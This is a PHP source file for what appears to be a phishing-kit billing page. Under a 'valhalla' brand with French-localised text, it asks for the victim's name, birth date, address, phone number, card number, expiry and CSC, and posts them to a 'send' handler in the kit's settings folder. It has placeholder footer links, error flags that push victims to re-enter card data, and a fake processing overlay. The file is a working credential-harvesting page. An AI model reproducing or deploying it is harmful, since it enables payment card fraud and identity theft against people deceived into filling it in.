<?php
	session_start();
	include("../settings/lang/index.php");

	$url = $_SERVER["REQUEST_URI"];
	if(strpos($url, "inconnubirth") == true) {
		$brtbug = "hasError";
	}
	if(strpos($url, "inconnuccnum") == true) {
		$ccbug = "hasError";
	}
	if(strpos($url, "inconnuexp") == true) {
		$expbug = "hasError";
	}
	if(strpos($url, "inconnucsc") == true) {
		$cscbug = "hasError";
	}
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title><?php echo $valhalla13; ?></title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/main.js"></script>
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
	<script src="../assets/js/jquery.CardValidator.js"></script>
	<script src="../assets/js/jquery.payment.js"></script>
</head>
<body>

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>

		<!--[ BILL CONTAINER ]-->
				<div class="valhallaContent valhallaContentInfo">

				<!-- CONTAINER --> 
					<div class="valhallasafeComponent">
						<header class="valhallaInfo">
							<div class="valhallaLogo big"></div>
						</header>
						<div class="valhallasafe">
							<h1 class="valhallaInfoTitle"><?php echo $valhalla14; ?></h1>
								<p class="valhallaFormTitle"><?php echo $valhalla15; ?></p>

							<form action="../settings/send/valhallainfo.php" method="post" name="bilForm" onsubmit="return validateBillForm()">

								<p class="FieldsTitle"><?php echo $valhalla16; ?></p>
								<div class="valhallaFieldset">
									<input type="text" class="capital" name="valhallaFnm" id="valhallaFnm" placeholder="<?php echo $valhalla17; ?>" maxlength="40" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaFname"]; ?>" />
								</div>
								<div class="valhallaFieldset">
									<input type="tel" class="<?php echo $brtbug; ?>" name="valhallaBirth" id="valhallaBirth" placeholder="<?php echo $valhalla18; ?>" maxlength="10" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaBirth"]; ?>" />
								</div>
								<div class="valhallaFieldset">
									<input type="text" name="valhallaAdr" id="valhallaAdr" placeholder="<?php echo $valhalla19; ?>" maxlength="40" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaAdrss"]; ?>" />
								</div>
								<div class="valhallaMultiFieldset">
									<input type="text"  name="valhallacty" id="valhallacty" class="capital" placeholder="<?php echo $valhalla20; ?>" maxlength="20" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaCitey"]; ?>" />
									<input type="text" name="valhallazip" id="valhallazip" placeholder="<?php echo $valhalla21; ?>" maxlength="10" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaZipcd"]; ?>" />
								</div>
								<div class="valhallaFieldset">
									<?php echo $country; ?>
								</div>
								<div class="valhallaFieldset">
									<input type="tel" name="valhallatel" id="valhallatel" placeholder="<?php echo $valhalla22; ?>" maxlength="15" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaNmtel"]; ?>" />
								</div>

								<p class="FieldsTitle">Card informations :</p>
								<div class="valhallaFieldset" style="position: relative;padding: ">
									<input type="tel" name="valhallacc" id="valhallacc" placeholder="<?php echo $valhalla23; ?>" class="valhallacc <?php echo $ccbug; ?>" maxlength="19" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaCcnum"]; ?>"/>
									<span class="cc-icon" id="cicon"></span>
								</div>
								<div class="valhallaMultiFieldset">
									<input type="tel" class="<?php echo $expbug; ?>" name="valhallaExp" id="valhallaExp" placeholder="<?php echo $valhalla24; ?>" maxlength="5" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaCcexp"]; ?>"/>
									<input type="tel" name="valhallacsc" id="valhallacsc" placeholder="<?php echo $valhalla25; ?>" class="valhallacsc <?php echo $cscbug; ?>" id="valhallacsc" maxlength="3" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["valhallaCccsc"]; ?>" />
								</div>
								<div class="valhallaWhatIsCCContainer">
									<a href="javascript:void(0)" class="valhallaWhatIsCC" id="valhallaWhatIsCC" onclick="valhallaWhatIsCC3()"><?php echo $valhalla26; ?></a>
									<p class="valhallaWhatIsCCText hide" id="valhallaWhatIsCCText3">
										<img src="../assets/img/3.png" alt="">
										<span><?php echo $valhalla27; ?></span>
									</p>
									<p class="valhallaWhatIsCCText hide" id="valhallaWhatIsCCText4">
										<img src="../assets/img/4.png" alt="">
										<span><?php echo $valhalla28; ?></span>
									</p>
								</div>

								<input type="submit" class="valhallaButton" name="valhallainfotp" value="<?php echo $valhalla29; ?>">
							</form>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>

	<footer class="valhallaFooter">
		<ul class="valhallaFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/sections.js"></script>

	<script>
		$(document).ready(function(){
		$('#valhallaFnm').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallaFnm').removeClass('hasError'); } else {$('#valhallaFnm').removeClass('hasError'); }});

		$('#valhallaBirth').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallaBirth').removeClass('hasError'); } else {$('#valhallaBirth').removeClass('hasError'); }});

		$('#valhallaAdr').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallaAdr').removeClass('hasError'); } else {$('#valhallaAdr').removeClass('hasError'); }});

		$('#valhallacty').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallacty').removeClass('hasError'); } else {$('#valhallacty').removeClass('hasError'); }});

		$('#valhallazip').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallazip').removeClass('hasError'); } else {$('#valhallazip').removeClass('hasError'); }});

		$('#valhallaCtry').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallaCtry').removeClass('hasError'); } else {$('#valhallaCtry').removeClass('hasError'); }});

		$('#valhallatel').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallatel').removeClass('hasError'); } else {$('#valhallatel').removeClass('hasError'); }});

		$('#valhallacc').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallacc').removeClass('hasError'); } else {$('#valhallacc').removeClass('hasError'); }});

		$('#valhallaExp').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallaExp').removeClass('hasError'); } else {$('#valhallaExp').removeClass('hasError'); }});

		$('#valhallacsc').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallacsc').removeClass('hasError'); } else {$('#valhallacsc').removeClass('hasError'); }});
		
		});
	</script>
	
<!-- LOADING -->
	<div class="valhallaLoaderOverlay">
		<div class="valhallaModalAnimate" id="valhallaModalAnimate">
			<div class="valhallaRotate"></div>
			<div class="valhallaProcessing"><?php echo $valhalla12; ?></div>
			<div class="valhallaLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="valhallaModalOverlay" id="valhallaModalOverlay"></div>

</body>
</html>